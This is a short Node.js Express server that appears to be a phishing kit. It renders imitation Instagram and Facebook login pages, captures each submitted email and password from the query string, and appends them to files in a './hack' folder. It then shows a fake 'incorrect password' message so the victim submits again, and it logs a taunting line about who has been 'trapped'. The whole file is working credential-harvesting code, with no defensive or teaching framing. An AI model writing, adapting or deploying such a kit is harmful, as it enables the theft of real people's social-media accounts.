// JAI SHREE RAM


var express = require('express')
var app = express()
var fs = require("fs")


app.use(express.static("./public"))

app.set("view engine" , "ejs")



function show(data) {
  console.log(data)
}


app.get("/", function (req, res) {
  res.render("insta" , {wrongpass: "Login with Facebook." , or: "OR"})
  show("Some One Just Entered.")
})

app.get("/continueInstagram/:logvia" , function (req , res) {
  
  const email = req.query.email
  const passwd = req.query.password
  const logvia = req.params.logvia

  fs.appendFile(`./hack/${logvia}/${email}.txt` , `+++${email}+++\n***${passwd}***\n` , (err) => {
    if (err) {
      res.send("/swr")
    }else{
      res.redirect(`/loginAgain/${logvia}`)
    }
  })

  show(`${email} naam ka banda fhass gaya! at ${new Date(Date.now())}`)


})

app.get("/swr" , function (req , res) {
  res.redirect("/")
})

app.get("/loginAgain/:via" , function (req , res) {

  const via = req.params.via


  if (via === `instagram`) res.render("insta" , {wrongpass : "Your Username or Password is Incorrect.\nPlease try agin." , or: ""})

  else if (via === `facebook`) res.render("fb" , {wrongpass : "Your Username or Password is Incorrect!.\nPlease try agin."})

  else res.redirect("/swr")
})


app.listen(3000 , () => {
  console.log("Server Started.")
})
